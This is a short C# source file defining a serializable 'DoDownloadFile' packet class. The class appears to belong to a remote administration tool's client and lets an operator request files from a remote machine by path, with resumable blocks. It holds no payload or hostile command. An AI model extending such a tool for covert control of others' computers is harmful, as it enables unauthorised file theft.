using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoDownloadFile : IPacket
    {
        public string RemotePath { get; set; }

        public int ID { get; set; }

        public int StartBlock { get; set; }
        
        public bool Resumed { get; set; }

        public string[] FolderItems { get; set; }

        public ItemOption[] FolderItemOptions { get; set; }

        public DoDownloadFile()
        {
        }

        public DoDownloadFile(string remotepath, int id, int startBlock, bool resumed = false)
        {
            this.RemotePath = remotepath;
            this.ID = id;
            this.StartBlock = startBlock;
            this.Resumed = resumed;
            this.FolderItems = new string[1];
            this.FolderItemOptions = new ItemOption[1];
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}